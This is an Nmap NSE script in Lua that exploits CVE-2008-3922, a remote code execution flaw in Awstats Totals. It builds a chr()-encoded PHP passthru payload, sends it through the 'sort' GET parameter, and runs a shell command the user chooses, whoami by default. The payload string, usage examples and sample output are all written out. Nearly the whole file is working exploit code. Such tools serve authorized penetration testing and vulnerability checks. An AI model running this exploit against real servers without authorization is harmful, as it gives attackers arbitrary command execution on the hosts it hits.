local http = require "http"
local io = require "io"
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"

description = [[
Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14 and possibly other products based on it (CVE: 2008-3922).

This vulnerability can be exploited through the GET variable sort. The script queries the web server with the command payload encoded using PHP's chr() function:
<code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>

Common paths for Awstats Total:
* <code>/awstats/index.php</code>
* <code>/awstatstotals/index.php</code>
* <code>/awstats/awstatstotals.php</code>

References:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922 
* http://www.exploit-db.com/exploits/17324/
]]

---
-- @usage
-- nmap -sV --script http-awstatstotals-exec.nse --script-args 'http-awstatstotals-exec.cmd="uname -a", http-awstatstotals-exec.uri=/awstats/index.php' <target>
-- nmap -sV --script http-awstatstotals-exec.nse <target>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-awstatstotals-exec.nse:
-- |_Output for 'uname -a':Linux 2.4.19 #1 Son Apr 14 09:53:28 CEST 2002 i686 GNU/Linux
--
-- @args http-awstatstotals-exec.uri Awstats Totals URI including path. Default: /index.php
-- @args http-awstatstotals-exec.cmd Command to execute. Default: whoami
-- @args http-awstatstotals-exec.outfile Output file. If set it saves the output in this file.
---
-- Other useful args when running this script:
-- http.useragent - User Agent to use in GET request
--

author = "Paulino Calderon"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"vuln", "intrusive", "exploit"}


portrule = shortport.http

--default values
local DEFAULT_CMD = "whoami"
local DEFAULT_URI = "/index.php"

---
--Writes string to file
-- @param filename Filename to write
-- @param content Content string
-- @return boolean status
-- @return string error
--Taken from: hostmap.nse
local function write_file(filename, contents)
  local f, err = io.open(filename, "w")
  if not f then
    return f, err
  end
  f:write(contents)
  f:close()
  return true
end

---
--Checks if Awstats Totals installation seems to be there
-- @param host Host table
-- @param port Port table
-- @param path Path pointing to AWStats Totals
-- @return true if awstats totals is found
local function check_installation(host, port, path)
  local check_req = http.get(host, port, path)
  if not(http.response_contains(check_req, "AWStats")) then
    return false
  end
  return true
end

---
--MAIN
---
action = function(host, port)
  local output = {}
  local uri = stdnse.get_script_args("http-awstatstotals-exec.uri") or DEFAULT_URI
  local cmd = stdnse.get_script_args("http-awstatstotals-exec.cmd") or DEFAULT_CMD
  local out = stdnse.get_script_args("http-awstatstotals-exec.outfile") 

  --check for awstats signature
  local awstats_check = check_installation(host, port, uri)
  if not(awstats_check) then
    stdnse.print_debug(1, "%s:This does not look like Awstats Totals. Quitting.", SCRIPT_NAME)
    return
  end
  
  --Encode payload using PHP's chr() 
  local encoded_payload = ""
  cmd:gsub(".", function(c) encoded_payload = encoded_payload .."chr("..string.byte(c)..")." end)
  if string.sub(encoded_payload, #encoded_payload) == "." then
    encoded_payload = string.sub(encoded_payload, 1, #encoded_payload-1)
  end
  local stealth_payload = "?sort={%24{passthru%28"..encoded_payload.."%29}}{%24{exit%28%29}}"

  --set payload and send request
  local req = http.get(host, port, uri .. stealth_payload)
  if req.status and req.status == 200 then
    output[#output+1] = string.format("\nOutput for '%s':%s", cmd, req.body)

    --if out set, save output to file
    if out then
      local status, err = write_file(out,  req.body)
      if status then
        output[#output+1] = string.format("Output saved to %s\n", out)
      else
        output[#output+1] = string.format("Error saving output to %s: %s\n", out, err)
      end
    end

  else
    if nmap.verbosity()>= 2 then
      output[#output+1] = "[Error] Request did not return 200. Make sure your URI value is correct. A WAF might be blocking your request"
    end
  end

  --output
  if #output>0 then
    return stdnse.strjoin("\n", output)
  end
end
